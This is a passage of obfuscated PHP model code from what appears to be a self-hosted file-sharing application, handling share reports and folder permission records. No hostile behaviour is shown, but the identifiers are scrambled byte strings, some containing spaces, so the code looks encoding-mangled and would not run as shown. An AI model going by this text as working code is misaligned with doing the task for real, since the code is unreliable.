$šÖ¾ëò = array_to_keyvalue($šÖ¾ëò, $æºÄğ‰‹[12], $æºÄğ‰‹[489]); if (!$šÖ¾ëò) { return; } $ûº¦²‡Ã = array($æºÄğ‰‹[488] => array($æºÄğ‰‹[418], $šÖ¾ëò)); $this->where($ûº¦²‡Ã)->delete(); Model($æºÄğ‰‹[602])->where($ûº¦²‡Ã)->delete(); } public function listAll($ÊğŒ×”ó) { $»’ÆÊ ­ =& $_SERVER[ßğøİ]; $Ù¶Éƒ¬— = array(); if ($ÊğŒ×”ó[$»’ÆÊ ­[1655]]) { $Ù¶Éƒ¬—[$»’ÆÊ ­[1655]] = $ÊğŒ×”ó[$»’ÆÊ ­[1655]]; } if ($ÊğŒ×”ó[$»’ÆÊ ­[758]]) { $ÄøïìÂ» = $ÊğŒ×”ó[$»’ÆÊ ­[497]] ? $ÊğŒ×”ó[$»’ÆÊ ­[497]] : strtotime(date($»’ÆÊ ­[1995])); $Ù¶Éƒ¬—[$»’ÆÊ ­[200]] = array($»’ÆÊ ­[333], array($ÊğŒ×”ó[$»’ÆÊ ­[758]], $ÄøïìÂ»)); } if ($ÊğŒ×”ó[$»’ÆÊ ­[33]]) { $Ù¶Éƒ¬—[$ÊğŒ×”ó[$»’ÆÊ ­[33]]] = 1; } else { $Ù¶Éƒ¬—[] = array($»’ÆÊ ­[494] => array($»’ÆÊ ­[1012], 0), $»’ÆÊ ­[496] => array($»’ÆÊ ­[1012], 0), $»’ÆÊ ­[1972] => $»’ÆÊ ­[1926]); } if ($ÊğŒ×”ó[$»’ÆÊ ­[1922]]) { $Ù¶Éƒ¬—[] = array($»’ÆÊ ­[491] => $ÊğŒ×”ó[$»’ÆÊ ­[1922]], $»’ÆÊ ­[1554] => array($»’ÆÊ ­[383], "\45{$ÊğŒ×”ó[$»’ÆÊ ­[1922]]}\x25"), $»’ÆÊ ­[1972] => $»’ÆÊ ­[1926]); } $‚–Î¦† = $this->_makeOrder()->where($Ù¶Éƒ¬—)->selectPage(20); if (empty($‚–Î¦†[$»’ÆÊ ­[369]])) { return array(); } $this->_listDataApply($‚–Î¦†[$»’ÆÊ ­[369]]); return $‚–Î¦†; } public function listDataApply($„Œ£ƒ¯Å) { $this->_listDataApply($„Œ£ƒ¯Å); return $„Œ£ƒ¯Å; } private function _listDataApply(&$÷±÷¥­È) { $ááŞ¯Ê¦ =& $_SERVER[ßğøİ]; $¼ÅÀÀ¢ƒ = array_to_keyvalue($÷±÷¥­È, $ááŞ¯Ê¦[12], $ááŞ¯Ê¦[1655]); $¸ƒˆãÔ = Model($ááŞ¯Ê¦[535])->userListInfo(array_unique($¼ÅÀÀ¢ƒ)); $ø°¶±£ = array_to_keyvalue($÷±÷¥­È, $ááŞ¯Ê¦[12], $ááŞ¯Ê¦[402]); $ï…®Ö›“ = Model($ááŞ¯Ê¦[822])->sourceListInfo($ø°¶±£, !0); foreach ($÷±÷¥­È as $ï±»ó‰ì => &$âİş§òÌ) { $ÁíûÓúğ = $âİş§òÌ[$ááŞ¯Ê¦[1655]]; $âİş§òÌ[$ááŞ¯Ê¦[1996]] = $¸ƒˆãÔ[$ÁíûÓúğ] ? $¸ƒˆãÔ[$ÁíûÓúğ] : !1; $‰àè°Áª = $âİş§òÌ[$ááŞ¯Ê¦[402]]; $âİş§òÌ[$ááŞ¯Ê¦[86]] = $ï…®Ö›“[$‰àè°Áª] ? $ï…®Ö›“[$‰àè°Áª] : !1; if ($âİş§òÌ[$ááŞ¯Ê¦[86]][$ááŞ¯Ê¦[431]] == $ááŞ¯Ê¦[88]) { unset($÷±÷¥­È[$ï±»ó‰ì]); } if ($âİş§òÌ[$ááŞ¯Ê¦[86]] != $ááŞ¯Ê¦[197] && !$âİş§òÌ[$ááŞ¯Ê¦[86]]) { unset($÷±÷¥­È[$ï±»ó‰ì]); } } unset($âİş§òÌ); $÷±÷¥­È = array_values($÷±÷¥­È); } private function _makeOrder($ãéÂÊ¥º = '') { $£˜•°Ì– =& $_SERVER[ßğøİ]; $µ«ÆÄáĞ = array($£˜•°Ì–[200], $£˜•°Ì–[497], $£˜•°Ì–[1985], $£˜•°Ì–[1986]); $Ç‹²È™Ç = array($£˜•°Ì–[450] => $£˜•°Ì–[451], $£˜•°Ì–[452] => $£˜•°Ì–[453]); $Å‘´Ú = Input::get($£˜•°Ì–[457], $£˜•°Ì–[7], $£˜•°Ì–[423], $µ«ÆÄáĞ); $Ô½İçŒğ = Input::get($£˜•°Ì–[458], $£˜•°Ì–[7], $£˜•°Ì–[1997], array($£˜•°Ì–[1919], $£˜•°Ì–[452])); $Ô½İçŒğ = $Ç‹²È™Ç[$Ô½İçŒğ]; $ãéÂÊ¥º = $ãéÂÊ¥º . "{$Å‘´Ú}\40{$Ô½İçŒğ}"; return $this->order($ãéÂÊ¥º); } public function reportAdd($‡Şİ­ûÄ) { $ô›Ê»‹ =& $_SERVER[ßğøİ]; $Éò¹ª° = array($ô›Ê»‹[489] => $‡Şİ­ûÄ[$ô›Ê»‹[489]], $ô›Ê»‹[1655] => USER_ID); if (Model($ô›Ê»‹[1993])->where($Éò¹ª°)->find()) { return !1; } $à––™š° = array($ô›Ê»‹[489] => $‡Şİ­ûÄ[$ô›Ê»‹[489]], $ô›Ê»‹[1554] => $‡Şİ­ûÄ[$ô›Ê»‹[1554]], $ô›Ê»‹[402] => $‡Şİ­ûÄ[$ô›Ê»‹[402]], $ô›Ê»‹[468] => $‡Şİ­ûÄ[$ô›Ê»‹[468]], $ô›Ê»‹[1655] => USER_ID, $ô›Ê»‹[33] => $‡Şİ­ûÄ[$ô›Ê»‹[33]], $ô›Ê»‹[453] => $‡Şİ­ûÄ[$ô›Ê»‹[453]]); return Model($ô›Ê»‹[1993])->add($à––™š°); } public function reportList($Ñıˆò‰£) { $şÎçË·’ =& $_SERVER[ßğøİ]; $é¢¡ÜÂ = array(); if ($Ñıˆò‰£[$şÎçË·’[758]]) { $§¸ä„š = $Ñıˆò‰£[$şÎçË·’[497]] ? $Ñıˆò‰£[$şÎçË·’[497]] : strtotime(date($şÎçË·’[1995])); $é¢¡ÜÂ[$şÎçË·’[200]] = array($şÎçË·’[333], array($Ñıˆò‰£[$şÎçË·’[758]], $§¸ä„š)); } if (isset($Ñıˆò‰£[$şÎçË·’[33]]) && in_array($Ñıˆò‰£[$şÎçË·’[33]], array($şÎçË·’[88], $şÎçË·’[437], $şÎçË·’[1998], $şÎçË·’[1999], $şÎçË·’[2000]))) { $é¢¡ÜÂ[$şÎçË·’[33]] = $Ñıˆò‰£[$şÎçË·’[33]]; } if (isset($Ñıˆò‰£[$şÎçË·’[747]]) && in_array($Ñıˆò‰£[$şÎçË·’[747]], array($şÎçË·’[197], $şÎçË·’[88], $şÎçË·’[437], $şÎçË·’[1998]))) { $é¢¡ÜÂ[$şÎçË·’[747]] = $Ñıˆò‰£[$şÎçË·’[747]]; } $‘‡‡’¡» = Input::get($şÎçË·’[458], $şÎçË·’[7], $şÎçË·’[1997], array($şÎçË·’[1919], $şÎçË·’[452])); $î´í½ì” = array($şÎçË·’[450] => $şÎçË·’[451], $şÎçË·’[452] => $şÎçË·’[453]); $§îÄÉì = $şÎçË·’[2001] . $î´í½ì”[$‘‡‡’¡»]; $Ø¹ĞıÙü = Model($şÎçË·’[1993])->where($é¢¡ÜÂ)->order($§îÄÉì)->selectPage(20); if (empty($Ø¹ĞıÙü[$şÎçË·’[369]])) { return array(); } $ÉÙ—ç = array_to_keyvalue_group($Ø¹ĞıÙü[$şÎçË·’[369]], $şÎçË·’[747], $şÎçË·’[489]); if (!empty($ÉÙ—ç[0])) { $Ñıˆò‰£ = $ÉÙ—ç[0]; $é¢¡ÜÂ = array($şÎçË·’[489] => array($şÎçË·’[7], $Ñıˆò‰£)); $ÔçùßÑ€ = $this->where($é¢¡ÜÂ)->field($şÎçË·’[489])->select(); $ÔçùßÑ€ = array_to_keyvalue($ÔçùßÑ€, $şÎçË·’[12], $şÎçË·’[489]); $ùÁ£¾–í = array_diff($Ñıˆò‰£, $ÔçùßÑ€); if (!empty($ùÁ£¾–í)) { foreach ($Ø¹ĞıÙü[$şÎçË·’[369]] as $ÂÊ¯Éã¬ => $­·–¥—) { if (in_array($­·–¥—[$şÎçË·’[489]], $ùÁ£¾–í)) { unset($Ø¹ĞıÙü[$şÎçË·’[369]][$ÂÊ¯Éã¬]); } } } } $this->_listDataApply($Ø¹ĞıÙü[$şÎçË·’[369]]); return $Ø¹ĞıÙü; } public function reportStatus($ùË¤Ç›º) { $ÓÀ¼şÜ =& $_SERVER[ßğøİ]; $óü°È¶’ = array($ÓÀ¼şÜ[399] => $ùË¤Ç›º[$ÓÀ¼şÜ[399]]); $’Î—ëóÊ = Model($ÓÀ¼şÜ[1993])->where($óü°È¶’)->field($ÓÀ¼şÜ[2002])->find(); if (!$’Î—ëóÊ) { return !1; } $Õúç¶ÄŒ = array($ÓÀ¼şÜ[747] => $ùË¤Ç›º[$ÓÀ¼şÜ[747]]); if ($ùË¤Ç›º[$ÓÀ¼şÜ[747]] == $ÓÀ¼şÜ[1998] && $’Î—ëóÊ[$ÓÀ¼şÜ[747]] == $ÓÀ¼şÜ[1998]) { $Õúç¶ÄŒ[$ÓÀ¼şÜ[747]] = 0; } $®³Ä áŒ = Model($ÓÀ¼şÜ[1993])->where($óü°È¶’)->save($Õúç¶ÄŒ); if ($ùË¤Ç›º[$ÓÀ¼şÜ[747]] == $ÓÀ¼şÜ[437]) { if ($’Î—ëóÊ[$ÓÀ¼şÜ[468]] != $ÓÀ¼şÜ[197] && $this->shareFileMeta($’Î—ëóÊ[$ÓÀ¼şÜ[468]])) { $this->shareFileMeta($’Î—ëóÊ[$ÓÀ¼şÜ[468]], 0); } $this->remove($’Î—ëóÊ[$ÓÀ¼şÜ[489]]); return !0; } if ($®³Ä áŒ && $ùË¤Ç›º[$ÓÀ¼şÜ[747]] == $ÓÀ¼şÜ[1998]) { $ŸÕÙ™¢ç = $Õúç¶ÄŒ[$ÓÀ¼şÜ[747]] == $ÓÀ¼şÜ[1998] ? 1 : 0; $this->shareFileMeta($’Î—ëóÊ[$ÓÀ¼şÜ[468]], $ŸÕÙ™¢ç); $this->removeByFile($’Î—ëóÊ[$ÓÀ¼şÜ[468]]); } return $®³Ä áŒ; } private function removeByFile($ÊÇåŞ“Ò) { $¤Æ¬ÜÊĞ =& $_SERVER[ßğøİ]; $·Šé¼€ = Model($¤Æ¬ÜÊĞ[822])->where(array($¤Æ¬ÜÊĞ[468] => $ÊÇåŞ“Ò))->field($¤Æ¬ÜÊĞ[402])->select(); $½œ ¢°§ = array_to_keyvalue($·Šé¼€, $¤Æ¬ÜÊĞ[12], $¤Æ¬ÜÊĞ[402]); $Û›ß®Úë = array($¤Æ¬ÜÊĞ[402] => array($¤Æ¬ÜÊĞ[7], $½œ ¢°§), $¤Æ¬ÜÊĞ[494] => 1); $·Šé¼€ = $this->where($Û›ß®Úë)->field($¤Æ¬ÜÊĞ[489])->select(); if (empty($·Šé¼€)) { return; } $«ğ©õ‹¼ = array_to_keyvalue($·Šé¼€, $¤Æ¬ÜÊĞ[12], $¤Æ¬ÜÊĞ[489]); $this->remove($«ğ©õ‹¼); } private function shareFileMeta($¯İâŠ, $©Øúâ¬ = null) { $ééñÁÅš =& $_SERVER[ßğøİ]; $¡ìÍÍšù = array($ééñÁÅš[468] => $¯İâŠ, $ééñÁÅš[94] => $ééñÁÅš[2003]); if (is_null($©Øúâ¬)) { return Model($ééñÁÅš[2004])->where($¡ìÍÍšù)->find(); } $¡ìÍÍšù[$ééñÁÅš[374]] = $©Øúâ¬; Model($ééñÁÅš[2004])->add($¡ìÍÍšù, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\143\x65\x5f\141\165\164\150"; public function getAuth($Ë‰ÕÅÚ) { $“ö˜äÜá =& $_SERVER[ßğøİ]; $˜‹†ˆ‹ = $this->sourceAuthSelect($Ë‰ÕÅÚ); $³¨§Œ›÷ = array(); $Œ²€íĞ = array(); $ «ì‡ ¯ = 2 << 25; foreach ($˜‹†ˆ‹ as $ÅÄ¹»‹) { $õ€£¦õÌ = Model($“ö˜äÜá[507])->listData($ÅÄ¹»‹[$“ö˜äÜá[1932]]); if (!$õ€£¦õÌ) { continue; } $³¨§Œ›÷[] = $ÅÄ¹»‹; $ÑŠöÄ•Ë = 0; if ($ÅÄ¹»‹[$“ö˜äÜá[411]] == SourceModel::TYPE_GROUP) { $ÑŠöÄ•Ë = $ «ì‡ ¯ * 2; } if ($ÅÄ¹»‹[$“ö˜äÜá[411]] == SourceModel::TYPE_USER) { $ÑŠöÄ•Ë = $ «ì‡ ¯; } if ($ÅÄ¹»‹[$“ö˜äÜá[411]] == SourceModel::TYPE_USER && $ÅÄ¹»‹[$“ö˜äÜá[505]] == $“ö˜äÜá[197]) { $ÑŠöÄ•Ë = 0; } $Œ²€íĞ[] = $õ€£¦õÌ[$“ö˜äÜá[413]] + $ÑŠöÄ•Ë; } array_multisort($Œ²€íĞ, SORT_DESC, $³¨§Œ›÷); return $³¨§Œ›÷; } public function sourceAuthSelect($Š“Ùœå•) { $ÓŸ–Ê³„ =& $_SERVER[ßğøİ]; static $»µÑ“¢ù = array(); $ÒÅ¾Ü™Å = is_array($Š“Ùœå•) ? !1 : !0; if ($ÒÅ¾Ü™Å) { $Š“Ùœå• = array($Š“Ùœå•); } $ë¦ïÄ÷ = array(); foreach ($Š“Ùœå• as $è¹£°ö‘) { if (isset($»µÑ“¢ù[$è¹£°ö‘])) { $ë¦ïÄ÷[$è¹£°ö‘] = $»µÑ“¢ù[$è¹£°ö‘]; } } if (count($ë¦ïÄ÷) == count($Š“Ùœå•)) { return $ÒÅ¾Ü™Å ? $ë¦ïÄ÷[$Š“Ùœå•[0]] : $ë¦ïÄ÷; } $•­ÂÙ§ = $ÓŸ–Ê³„[2005]; $Ÿ´ÍïÏ = array($ÓŸ–Ê³„[402] => array($ÓŸ–Ê³„[7], $Š“Ùœå•)); $ó«ò—• = $this->field($•­ÂÙ§)->order($ÓŸ–Ê³„[399])->where($Ÿ´ÍïÏ)->select(); $›ßıÂá… = array_to_keyvalue_group($ó«ò—•, $ÓŸ–Ê³„[402]); foreach ($Š“Ùœå• as $è¹£°ö‘) { $»µÑ“¢ù[$è¹£°ö‘] = $›ßıÂá…[$è¹£°ö‘] ? $›ßıÂá…[$è¹£°ö‘] : array(); } if ($ÒÅ¾Ü™Å) { return $ó«ò—•; } return $›ßıÂá…; } public function setAuth($Øóà™À´, $í‹ÂíôÄ) { $×ûÀßø =& $_SERVER[ßğøİ]; $ñä®©Œ® = Model($×ûÀßø[1327])->sourceInfo($Øóà™À´); if (!$ñä®©Œ®) { return !1; } if ($ñä®©Œ®[$×ûÀßø[411]] != SourceModel::TYPE_GROUP) { return !1; } $‡œ€­ı = 1; $î£©Ö‰Ó = $ñä®©Œ®[$×ûÀßø[505]]; if ($î£©Ö‰Ó != $‡œ€­ı) { $©çŸ€Îä = array($×ûÀßø[1828] => $î£©Ö‰Ó); $ÎòùÉÒñ = Model($×ûÀßø[1918])->field($×ûÀßø[1655])->where($©çŸ€Îä)->select(); $ÎòùÉÒñ = array_to_keyvalue($ÎòùÉÒñ, $×ûÀßø[12], $×ûÀßø[1655]); } $À¦ÑÎ²è = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $”Ü›¡«ä = array(); foreach ($í‹ÂíôÄ as $ö€£ĞÎ…) { if (!in_array($ö€£ĞÎ…[$×ûÀßø[411]], $À¦ÑÎ²è)) { show_json(LNG($×ûÀßø[2006]), !1); } if ($î£©Ö‰Ó != $‡œ€­ı) { if ($ö€£ĞÎ…[$×ûÀßø[411]] == SourceModel::TYPE_GROUP) { } if ($ö€£ĞÎ…[$×ûÀßø[505]] != 0 && !in_array($ö€£ĞÎ…[$×ûÀßø[505]], $ÎòùÉÒñ)) { } } if ($ö€£ĞÎ…[$×ûÀßø[505]] == 0) { $ö€£ĞÎ…[$×ûÀßø[411]] = SourceModel::TYPE_USER; } $”Ü›¡«ä[] = array($×ûÀßø[402] => $Øóà™À´, $×ûÀßø[411] => intval($ö€£ĞÎ…[$×ûÀßø[411]]), $×ûÀßø[505] => intval($ö€£ĞÎ…[$×ûÀßø[505]]), $×ûÀßø[1932] => intval($ö€£ĞÎ…[$×ûÀßø[1932]]) ? intval($ö€£ĞÎ…[$×ûÀßø[1932]]) : 0, $×ûÀßø[1988] => intval($ö€£ĞÎ…[$×ûÀßø[1988]]) ? intval($ö€£ĞÎ…[$×ûÀßø[1988]]) : -1); } $this->where(array($×ûÀßø[417] => $Øóà™À´))->delete(); $this->addAll($”Ü›¡«ä); return !0; } public function authClear($Ø˜å™”¹) { $¨Ì‹–¨² =& $_SERVER[ßğøİ]; $æ”éºõš = Model($¨Ì‹–¨²[1327])->sourceInfo($Ø˜å™”¹); $Íı£èô« = array($Ø˜å™”¹); if ($æ”éºõš[$¨Ì‹–¨²[410]] == $¨Ì‹–¨²[88]) { $¢âí¯Î = array($¨Ì‹–¨²[590] => array($¨Ì‹–¨²[550], $æ”éºõš[$¨Ì‹–¨²[521]] . $Ø˜å™”¹ . $¨Ì‹–¨²[551])); $Íı£èô« = Model($¨Ì‹–¨²[1327])->field($¨Ì‹–¨²[417])->where($¢âí¯Î)->getField($¨Ì‹–¨²[402], !0); $Íı£èô«[] = $Ø˜å™”¹; } $this->where(array($¨Ì‹–¨²[417] => array($¨Ì‹–¨²[418], $Íı£èô«)))->delete(); return !0; } public function getAllChildren($şó¼ëä) { $«áÀÌÕ =& $_SERVER[ßğøİ]; $˜Ú„ºÙÅ = Model($«áÀÌÕ[1327])->sourceInfo($şó¼ëä); if ($˜Ú„ºÙÅ[$«áÀÌÕ[410]] != $«áÀÌÕ[88]) { return $this->sourceListAuth(array($şó¼ëä)); } if ($˜Ú„ºÙÅ[$«áÀÌÕ[411]] != SourceModel::TYPE_GROUP) { return array(); } $æíÑ“ = 1; $‘†¯Ä›ı = array($şó¼ëä); if ($˜Ú„ºÙÅ[$«áÀÌÕ[432]] == $«áÀÌÕ[197] && $˜Ú„ºÙÅ[$«áÀÌÕ[505]] != $æíÑ“) { $‘†¯Ä›ı = $this->groupChidldAllRootSource($˜Ú„ºÙÅ[$«áÀÌÕ[505]]); } $ª…úí‘§ = $this->field($«áÀÌÕ[402])->group($«áÀÌÕ[402])->select(); $ª…úí‘§ = array_to_keyvalue($ª…úí‘§, $«áÀÌÕ[12], $«áÀÌÕ[402]); if (!$ª…úí‘§) { return array(); } $÷Å‡°ö¬ = $«áÀÌÕ[2007]; $©Úº†ù = array($«áÀÌÕ[402] => array($«áÀÌÕ[7], $ª…úí‘§), $«áÀÌÕ[431] => $«áÀÌÕ[197]); $—Ñõˆª’ = Model($«áÀÌÕ[822])->field($÷Å‡°ö¬)->where($©Úº†ù)->select(); $¹ƒûà³ = array($şó¼ëä); foreach ($—Ñõˆª’ as $Ê÷‰½„Ö) { foreach ($‘†¯Ä›ı as $ÙÒœ¬ç†) { $çê¢üŠƒ = $«áÀÌÕ[50] . $ÙÒœ¬ç† . $«áÀÌÕ[50]; $ÕÌ€ÙÀ« = $Ê÷‰½„Ö[$«áÀÌÕ[521]] . $Ê÷‰½„Ö[$«áÀÌÕ[402]] . $«áÀÌÕ[50]; if (strstr($ÕÌ€ÙÀ«, $çê¢üŠƒ)) { $¹ƒûà³[] = $Ê÷‰½„Ö[$«áÀÌÕ[402]]; break; } } } return $this->sourceListAuth($¹ƒûà³); } private function sourceListAuth($«Ÿ™®ë½) { $ù½ø¹Ëô =& $_SERVER[ßğøİ]; $óòì¬Áû = Model($ù½ø¹Ëô[1327])->sourceListInfo($«Ÿ™®ë½, !0); $¾ñ‘Ã™º = $this->sourceAuthSelect($«Ÿ™®ë½); $íüÉÔ¦Ø = array(); $¬¿‹âê­ = array(); foreach ($óòì¬Áû as $ıõãø ) { unset($ıõãø [$ù½ø¹Ëô[456]]); unset($ıõãø [$ù½ø¹Ëô[454]]); unset($ıõãø [$ù½ø¹Ëô[413]]); unset($ıõãø [$ù½ø¹Ëô[86]]); $¢Ù”Ûô = $¾ñ‘Ã™º[$ıõãø [$ù½ø¹Ëô[402]]]; if (!$¢Ù”Ûô) { continue; } $ıõãø [$ù½ø¹Ëô[2008]] = $this->authTargetInfo($¢Ù”Ûô); $ıõãø [$ù½ø¹Ëô[519]] = rtrim($ıõãø [$ù½ø¹Ëô[525]], $ù½ø¹Ëô[8]) . $ù½ø¹Ëô[8] . ltrim($ıõãø [$ù½ø¹Ëô[519]], $ù½ø¹Ëô[8]); $íüÉÔ¦Ø[] = $ıõãø ; $’Ö¡¢ß = count(explode($ù½ø¹Ëô[8], trim($ıõãø [$ù½ø¹Ëô[519]], $ù½ø¹Ëô[8]))); $¬¿‹âê­[] = $’Ö¡¢ß + ($ıõãø [$ù½ø¹Ëô[33]] == $ù½ø¹Ëô[75] ? 0 : 1000); } array_multisort($¬¿‹âê­, SORT_ASC, $íüÉÔ¦Ø); return $íüÉÔ¦Ø; } private function groupChidldAllRootSource($¹Ç®û®) { $ı¼…Ñûé =& $_SERVER[ßğøİ]; $Òö¨ê²º = Model($ı¼…Ñûé[2009])->groupChildrenAll($¹Ç®û®); $ª—õ¢Áş = array($ı¼…Ñûé[432] => 0, $ı¼…Ñûé[505] => array($ı¼…Ñûé[7], $Òö¨ê²º), $ı¼…Ñûé[411] => SourceModel::TYPE_GROUP); $ºß˜®šµ = Model($ı¼…Ñûé[822])->field($ı¼…Ñûé[402])->where($ª—õ¢Áş)->select(); $ºß˜®šµ = array_to_keyvalue($ºß˜®šµ, $ı¼…Ñûé[12], $ı¼…Ñûé[402]); return $ºß˜®šµ; } private function authTargetInfo($´¼„öï) { $Ÿû›Ğâ =& $_SERVER[ßğøİ]; $¾¬–öø– = array(); $ëËá¶‰’ = array(); $ª¬Í¿’û = 2 << 25; foreach ($´¼„öï as $Í¦óª­œ) { $ÊÖ¶€âš = Model($Ÿû›Ğâ[507])->listData($Í¦óª­œ[$Ÿû›Ğâ[1932]]); if (!$ÊÖ¶€âš) { continue; } if ($Í¦óª­œ[$Ÿû›Ğâ[411]] == SourceModel::TYPE_USER) { $ƒÊÙÆœŠ = Model($Ÿû›Ğâ[513])->getInfoSimpleOuter($Í¦óª­œ[$Ÿû›Ğâ[505]]); if ($ƒÊÙÆœŠ[$Ÿû›Ğâ[1655]] == $Ÿû›Ğâ[1190]) { continue; } if ($ƒÊÙÆœŠ[$Ÿû›Ğâ[1655]] == $Ÿû›Ğâ[197]) { $ƒÊÙÆœŠ[$Ÿû›Ğâ[32]] = LNG($Ÿû›Ğâ[2010]); } } else { $ƒÊÙÆœŠ = Model($Ÿû›Ğâ[522])->getInfoSimple($Í¦óª­œ[$Ÿû›Ğâ[505]]); } if (!$ƒÊÙÆœŠ) { continue; } $ƒÊÙÆœŠ[$Ÿû›Ğâ[467]] = $ÊÖ¶€âš; $¾¬–öø–[] = $ƒÊÙÆœŠ; $«¦’ç¦ = 0; if ($Í¦óª­œ[$Ÿû›Ğâ[411]] == SourceModel::TYPE_GROUP) { $«¦’ç¦ = $ª¬Í¿’û * 2; } if ($Í¦óª­œ[$Ÿû›Ğâ[411]] == SourceModel::TYPE_USER) { $«¦’ç¦ = $ª¬Í¿’û; } if ($Í¦óª­œ[$Ÿû›Ğâ[411]] == SourceModel::TYPE_USER && $Í¦óª­œ[$Ÿû›Ğâ[505]] == $Ÿû›Ğâ[197]) { $«¦’ç¦ = 0; } $ëËá¶‰’[] = $ÊÖ¶€âš[$Ÿû›Ğâ[413]] + $«¦’ç¦; } array_multisort($ëËá¶‰’, SORT_DESC, $¾¬–öø–); return $¾¬–öø–; } public function getAllChildrenByUser($İ¶˜ââ, $ÍÔ˜Ú„³) { $¥®¤±òê =& $_SERVER[ßğøİ]; $ğàÕ³úş = Model($¥®¤±òê[535])->getInfo($ÍÔ˜Ú„³); if (!$ÍÔ˜Ú„³ || !$İ¶˜ââ || !$ğàÕ³úş) { return array(); } $Ô›ö†ú™ = Model($¥®¤±òê[1327])->sourceInfo($İ¶˜ââ); $Šç”ğÌç = array(); $«Œ²ÛàÉ = 1; if ($Ô›ö†ú™[$¥®¤±òê[432]] == $¥®¤±òê[197] && $Ô›ö†ú™[$¥®¤±òê[505]] != $«Œ²ÛàÉ && $this->groupContainUser($Ô›ö†ú™[$¥®¤±òê[505]], $ÍÔ˜Ú„³)) { foreach ($ğàÕ³úş[$¥®¤±òê[2011]] as $ïÓšğ–û) { $²ô×©æ  = Model($¥®¤±òê[522])->getInfo($ïÓšğ–û[$¥®¤±òê[1828]]); $ÀéÉÕêÖ = Model($¥®¤±òê[535])->getInfoSimpleOuter($ÍÔ˜Ú„³); $ÀéÉÕêÖ[$¥®¤±òê[467]] = $ïÓšğ–û[$¥®¤±òê[413]]; if (Model($¥®¤±òê[507])->authCheckAction($ïÓšğ–û[$¥®¤±òê[413]][$¥®¤±òê[413]], $¥®¤±òê[1849])) { continue; } $÷à®³Íé = array($¥®¤±òê[32] => $¥®¤±òê[1603] . $²ô×©æ [$¥®¤±òê[32]], $¥®¤±òê[402] => $²ô×©æ [$¥®¤±òê[86]][$¥®¤±òê[402]], $¥®¤±òê[84] => KodIO::make($²ô×©æ [$¥®¤±òê[86]][$¥®¤±òê[402]]), $¥®¤±òê[432] => $¥®¤±òê[197], $¥®¤±òê[411] => $¥®¤±òê[515], $¥®¤±òê[33] => $¥®¤±òê[554], $¥®¤±òê[519] => $²ô×©æ [$¥®¤±òê[526]], $¥®¤±òê[1828] => $²ô×©æ [$¥®¤±òê[1828]], $¥®¤±òê[523] => $²ô×©æ [$¥®¤±òê[432]], $¥®¤±òê[2008] => array($ÀéÉÕêÖ)); $Šç”ğÌç[$÷à®³Íé[$¥®¤±òê[402]]] = $÷à®³Íé; } } $Ø½áŸàá = array(); $³±‡ÂÇ = $this->getAllChildren($İ¶˜ââ); foreach ($³±‡ÂÇ as $İÖ“áçì) { $î–ıà©§ = !1; foreach ($İÖ“áçì[$¥®¤±òê[2008]] as $€¸™ç†ë) { if ($€¸™ç†ë[$¥®¤±òê[1655]]) { if ($€¸™ç†ë[$¥®¤±òê[1655]] == $ÍÔ˜Ú„³) { $î–ıà©§ = !0; break; } } if ($€¸™ç†ë[$¥®¤±òê[1828]]) { if ($this->groupContainUser($€¸™ç†ë[$¥®¤±òê[1828]], $ÍÔ˜Ú„³)) { $î–ıà©§ = !0; break; } } } if ($î–ıà©§) { $Ø½áŸàá[] = $İÖ“áçì; } $ãŒÛëé = $İÖ“áçì[$¥®¤±òê[402]]; if (isset($Šç”ğÌç[$ãŒÛëé])) { $İÖ“áçì[$¥®¤±òê[2008]][] = $Šç”ğÌç[$ãŒÛëé][0]; $Šç”ğÌç[$ãŒÛëé] = !1; } } $Šç”ğÌç = array_filter(array_values($Šç”ğÌç)); $Ø½áŸàá = array_merge($Šç”ğÌç, $Ø½áŸàá); return $Ø½áŸàá; } public function setAllChildrenByUser($ó³²Èö“, $‡…½ª¢õ, $ÁòªÁ‚°) { $ÆÇõ«™µ =& $_SERVER[ßğøİ]; $Ä îàòÕ = $this->getAllChildrenByUser($ó³²Èö“, $‡…½ª¢õ); if (!$ÁòªÁ‚° || !$Ä îàòÕ) { return !1; } foreach ($Ä îàòÕ as $ÙÇ÷ÉÙÙ) { $«¤²Í¾È = array(); foreach ($ÙÇ÷ÉÙÙ[$ÆÇõ«™µ[2008]] as $àÙµó•ç) { $ÈÄ•Ë†â = $àÙµó•ç[$ÆÇõ«™µ[467]]; $Ì¦²È„õ = $àÙµó•ç[$ÆÇõ«™µ[1655]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $†›³É“œ = $àÙµó•ç[$ÆÇõ«™µ[1655]] ? $àÙµó•ç[$ÆÇõ«™µ[1655]] : $àÙµó•ç[$ÆÇõ«™µ[1828]]; if ($àÙµó•ç[$ÆÇõ«™µ[1655]] && $àÙµó•ç[$ÆÇõ«™µ[1655]] == $‡…½ª¢õ) { continue; } $«¤²Í¾È[] = array($ÆÇõ«™µ[402] => $ÙÇ÷ÉÙÙ[$ÆÇõ«™µ[402]], $ÆÇõ«™µ[411] => $Ì¦²È„õ, $ÆÇõ«™µ[505] => intval($†›³É“œ), $ÆÇõ«™µ[1932] => isset($ÈÄ•Ë†â[$ÆÇõ«™µ[399]]) ? intval($ÈÄ•Ë†â[$ÆÇõ«™µ[399]]) : 0, $ÆÇõ«™µ[1988] => isset($ÈÄ•Ë†â[$ÆÇõ«™µ[1988]]) ? intval($ÈÄ•Ë†â[$ÆÇõ«™µ[1988]]) : -1); } $«¤²Í¾È[] = array($ÆÇõ«™µ[402] => $ÙÇ÷ÉÙÙ[$ÆÇõ«™µ[402]], $ÆÇõ«™µ[411] => SourceModel::TYPE_USER, $ÆÇõ«™µ[505] => intval($‡…½ª¢õ), $ÆÇõ«™µ[1932] => intval($ÁòªÁ‚°), $ÆÇõ«™µ[1988] => -1); $this->where(array($ÆÇõ«™µ[417] => $ÙÇ÷ÉÙÙ[$ÆÇõ«™µ[402]]))->delete(); $this->addAll($«¤²Í¾È); } return !0; } public function get($‹ı¼„„À) { $šƒÎñ = $this->getSourceList(array($‹ı¼„„À), !0); return $šƒÎñ[0]; } public function getSourceList($°”´Ğæ‹, $Â×Ö¢×í = false, $€ÊÖ¯ = false) { $èĞÌÙÜ« =& $_SERVER[ßğøİ]; if (!$°”´Ğæ‹) { return array(); } $ŞòçöïÜ = Model($èĞÌÙÜ«[1327]); if (!$Â×Ö¢×í && count($°”´Ğæ‹) == 1) { $Â×Ö¢×í = array(); $Â×Ö¢×í[$°”´Ğæ‹[0]] = 